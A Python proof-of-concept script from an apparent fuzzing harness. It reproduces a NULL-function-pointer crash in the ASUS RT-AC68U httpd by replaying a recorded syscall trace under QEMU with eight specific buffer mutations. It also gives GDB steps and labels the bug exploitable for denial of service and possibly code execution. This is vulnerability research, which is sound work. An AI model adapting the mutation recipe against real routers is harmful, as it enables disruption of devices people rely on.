#!/usr/bin/env python3
"""
poc_as68u.py — PoC for NB-AS68U-01

Crash: SIGSEGV at pc=0x0 (NULL function pointer) in ASUS RT-AC68U httpd.

NB-AS68U-01 (c716a47b):
  Signal: SIGSEGV  PC: 0x0 (NULL fn ptr call)
  Campaign hits: 208 in V2_ac68u ablation
  Verdict: EXPLOITABLE (DoS unconditional; RCE if mmap(NULL) permitted)

Mechanism:
  replace_buffer_large at idx=282/438/465: zero out buffers containing
  function pointer tables → httpd dereferences NULL ptr → SIGSEGV pc=0x0.

Trace: tests/seeds/Asus_RTAC68U.trace
  fork_point=101

Usage:
  cd rr_fuzzing/fuzzing
  python3 ../tests/scripts/fuzzing/poc_as68u.py [--max-rounds N] [--gdb]

GDB (with --gdb):
  gdb-multiarch tests/verified_targets/Asus_RTAC68U/rootfs/usr/sbin/httpd
  (gdb) set architecture arm
  (gdb) target remote :9998
  (gdb) continue
  # On SIGSEGV: info registers; bt; info symbol $pc
"""
import sys, argparse
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT / 'fuzzing'))

from conductor.qemu_executor import QEMUExecutor
from conductor.conductor_types import FuzzInstruction

ROOTFS     = str(ROOT / 'tests/verified_targets/Asus_RTAC68U/rootfs')
BUILD      = str(ROOT / '../../build')
BINARY     = f'{ROOTFS}/usr/sbin/httpd'
TRACE      = str(ROOT / 'tests/seeds/Asus_RTAC68U.trace')
FORK_POINT = 101
GDB_PORT   = 9998

# NB-AS68U-01: SIGSEGV at 0x0 (NULL function pointer)
# Recipe from crash_w0_000115_c716a47b (V2_ac68u ablation campaign)
# replace_buffer_large zeroes out buffers containing fn-ptr tables
MUTATIONS = [
    FuzzInstruction(syscall_index=119, cmd=9, arg_index=1,
                    data=b'\x03', offset=0, size=1,
                    mutation_type='vuln_pattern'),
    FuzzInstruction(syscall_index=192, cmd=3, arg_index=0,
                    data=b'\x04', offset=0, size=1,
                    mutation_type='flags'),
    FuzzInstruction(syscall_index=236, cmd=8, arg_index=1,
                    data=b'\x10\x00\x00\x00', offset=0, size=4,
                    mutation_type='extend'),
    FuzzInstruction(syscall_index=282, cmd=2, arg_index=1,
                    data=b'\x00' * 512, offset=0, size=512,
                    mutation_type='replace_buffer_large'),
    FuzzInstruction(syscall_index=315, cmd=4, arg_index=1,
                    data=b'\x00\x10\x00\x00\x00\x00\x00\x00', offset=0, size=8,
                    mutation_type='boundary_value'),
    FuzzInstruction(syscall_index=349, cmd=3, arg_index=0,
                    data=b'\x04', offset=0, size=1,
                    mutation_type='flags'),
    FuzzInstruction(syscall_index=438, cmd=2, arg_index=1,
                    data=b'\x00' * 1024, offset=0, size=1024,
                    mutation_type='replace_buffer_large'),
    FuzzInstruction(syscall_index=465, cmd=2, arg_index=1,
                    data=b'\x00' * 1024, offset=0, size=1024,
                    mutation_type='replace_buffer_large'),
]


def run_poc(max_rounds: int, gdb_mode: bool):
    extra_args = ['-g', str(GDB_PORT)] if gdb_mode else []

    if gdb_mode:
        print(f'\nConnect GDB:')
        print(f'  gdb-multiarch {BINARY}')
        print(f'  (gdb) set architecture arm')
        print(f'  (gdb) target remote :{GDB_PORT}')
        print(f'  (gdb) continue\n')

    executor = QEMUExecutor(
        qemu_path=f'{BUILD}/qemu-arm',
        target_binary=BINARY,
        ld_prefix=ROOTFS,
        timeout=20.0,
        extra_qemu_args=extra_args,
    )

    print(f'[*] NB-AS68U-01 PoC (c716a47b)')
    print(f'[*] Target     : {BINARY}')
    print(f'[*] Trace      : {TRACE}')
    print(f'[*] fork_point : {FORK_POINT}')
    print(f'[*] Expected PC: 0x0 (NULL fn ptr)')
    print(f'[*] Mutations  : {len(MUTATIONS)} (network-FD only)')
    print()

    found = False
    for rnd in range(1, max_rounds + 1):
        results = executor.execute_fork(
            trace_file=TRACE,
            fork_point=FORK_POINT,
            mutation_variants=[MUTATIONS],
            depth=0,
            iteration_id=rnd,
        )

        if not results:
            if rnd % 50 == 0:
                print(f'  round {rnd:4d}: no result')
            continue

        r = results[0]
        crashed = getattr(r, 'crashed', False)
        sig     = getattr(r, 'signal_number', None)
        pc      = hex(getattr(r, 'pc', 0) or 0)

        if crashed:
            print(f'  round {rnd:4d}: *** CRASH ***  pc={pc}  signal={sig}')
            found = True
            break
        elif rnd % 50 == 0:
            print(f'  round {rnd:4d}: {getattr(r, "status_name", "ok")}')

    executor.stop_persistent_qemu()

    print()
    if found:
        print(f'★ NB-AS68U-01 CONFIRMED: pc={pc}  signal={sig}')
        print(f'  NULL function pointer in httpd — DoS unconditional, RCE if mmap(NULL) allowed')
    else:
        print(f'✗ Not reproduced in {max_rounds} rounds')
        print(f'  Note: ARM heap layout is sensitive; try more rounds.')
    return found


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--max-rounds', type=int, default=200)
    ap.add_argument('--gdb',        action='store_true')
    args = ap.parse_args()
    run_poc(args.max_rounds, args.gdb)


if __name__ == '__main__':
    main()
